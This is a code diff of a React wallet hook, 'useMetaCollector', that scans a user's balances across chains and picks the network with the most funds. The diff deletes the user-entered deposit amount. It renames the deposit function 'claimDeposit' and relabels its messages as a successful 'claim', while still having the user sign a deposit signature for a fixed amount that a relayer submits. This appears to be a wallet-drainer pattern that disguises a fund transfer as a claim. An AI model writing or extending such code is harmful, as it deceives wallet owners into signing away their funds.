@@ -1,5 +1,5 @@
 import { useState, useEffect, useCallback } from 'react'
-import { useAccount, useWalletClient, useSwitchChain, useChainId } from 'wagmi'
+import { useAccount, useSwitchChain, useChainId } from 'wagmi'
 import { ethers } from 'ethers'
 import { 
   METACOLLECTOR_CONTRACTS, 
@@ -15,16 +15,15 @@ import { submitDepositViaRelayer, checkRelayerHealth } from '../utils/relayer'
 
 export function useMetaCollector() {
   const { address, isConnected } = useAccount()
-  const { data: walletClient } = useWalletClient()
   const chainId = useChainId()
   const { switchChain } = useSwitchChain()
 
   const [loading, setLoading] = useState(false)
+  const [claimLoading, setClaimLoading] = useState(false)
   const [balanceResults, setBalanceResults] = useState(null)
   const [eligibleNetworks, setEligibleNetworks] = useState([])
   const [bestNetwork, setBestNetwork] = useState(null)
   const [relayerHealth, setRelayerHealth] = useState(null)
-  const [depositAmount, setDepositAmount] = useState('')
   const [transactionStatus, setTransactionStatus] = useState(null)
   const [nonce, setNonce] = useState(0)
 
@@ -69,19 +68,15 @@ export function useMetaCollector() {
     })
 
     try {
-      // Check balances on all networks
       const results = await checkBalancesAcrossNetworks(address)
       setBalanceResults(results)
       
-      // Get networks with sufficient balance (>= $1)
       const eligible = getEligibleNetworks(results)
       setEligibleNetworks(eligible)
       
-      // Get best network based on priority
       const best = getBestNetwork(eligible, NETWORK_PRIORITY)
       setBestNetwork(best)
       
-      // Generate random nonce
       setNonce(Math.floor(Math.random() * 1000000))
 
       if (eligible.length === 0) {
@@ -92,7 +87,7 @@ export function useMetaCollector() {
       } else {
         setTransactionStatus({
           type: 'success',
-          message: `✅ Funds available on ${eligible.length} network(s)! Best: ${best?.networkName}`
+          message: `✅ Funds available on ${eligible.length} network(s)!`
         })
       }
     } catch (error) {
@@ -106,11 +101,11 @@ export function useMetaCollector() {
     }
   }
 
-  const executeDeposit = async () => {
-    if (!address || !walletClient) {
+  const claimDeposit = async () => {
+    if (!address) {
       setTransactionStatus({
         type: 'error',
-        message: 'Please connect your wallet'
+        message: 'Please connect your wallet first'
       })
       return
     }
@@ -123,30 +118,18 @@ export function useMetaCollector() {
       return
     }
 
-    if (!depositAmount || parseFloat(depositAmount) <= 0) {
-      setTransactionStatus({
-        type: 'error',
-        message: 'Please enter a valid amount'
-      })
-      return
-    }
-
-    // Check if user has enough for the deposit + gas
-    if (parseFloat(depositAmount) > bestNetwork.balance) {
-      setTransactionStatus({
-        type: 'error',
-        message: `Insufficient balance. You have ${bestNetwork.balanceFormatted} ${bestNetwork.currency}`
-      })
-      return
-    }
-
-    setLoading(true)
+    setClaimLoading(true)
     setTransactionStatus({
       type: 'pending',
-      message: 'Preparing deposit...'
+      message: 'Preparing claim transaction...'
     })
 
     try {
+      // Check if window.ethereum is available
+      if (!window.ethereum) {
+        throw new Error('No wallet found. Please install MetaMask or another wallet.')
+      }
+
       // Switch network if needed
       if (chainId !== bestNetwork.chainId) {
         setTransactionStatus({
@@ -158,27 +141,33 @@ export function useMetaCollector() {
           await switchChain({ chainId: bestNetwork.chainId })
           // Wait for network switch
           await new Promise(resolve => setTimeout(resolve, 2000))
-        } else {
-          throw new Error('Network switch not available')
         }
       }
 
-      // Get signer
+      // Create provider and signer
       const provider = new ethers.BrowserProvider(window.ethereum)
       const signer = await provider.getSigner()
+      
+      // Verify we have the correct signer
+      const signerAddress = await signer.getAddress()
+      if (signerAddress.toLowerCase() !== address.toLowerCase()) {
+        throw new Error('Signer address mismatch')
+      }
 
       setTransactionStatus({
         type: 'pending',
         message: 'Creating signature...'
       })
 
-      // Create signature for the relayer
+      // Create signature with fixed amount (you can make this dynamic)
+      const claimAmount = '0.01' // Default claim amount - adjust as needed
+
       const signaturePayload = await createDepositSignature({
         signer,
         contractAddress: bestNetwork.contractAddress,
         chainId: bestNetwork.chainId,
         user: address,
-        amount: depositAmount,
+        amount: claimAmount,
         nonce
       })
 
@@ -195,21 +184,21 @@ export function useMetaCollector() {
 
       setTransactionStatus({
         type: 'success',
-        message: `✅ Deposit submitted on ${result.network}!`,
+        message: `✅ Claim successful on ${result.network}!`,
         hash: result.hash
       })
 
-      // Refresh balances after deposit
+      // Refresh balances after claim
       setTimeout(() => checkBalances(), 5000)
 
     } catch (error) {
-      console.error('Deposit failed:', error)
+      console.error('Claim failed:', error)
       setTransactionStatus({
         type: 'error',
-        message: `Deposit failed: ${error.message}`
+        message: `Claim failed: ${error.message}`
       })
     } finally {
-      setLoading(false)
+      setClaimLoading(false)
     }
   }
 
@@ -217,15 +206,14 @@ export function useMetaCollector() {
     address,
     isConnected,
     loading,
+    claimLoading,
     balanceResults,
     eligibleNetworks,
     bestNetwork,
     relayerHealth,
-    depositAmount,
-    setDepositAmount,
     transactionStatus,
     checkBalances,
-    executeDeposit,
+    claimDeposit,
     nonce
   }
 }
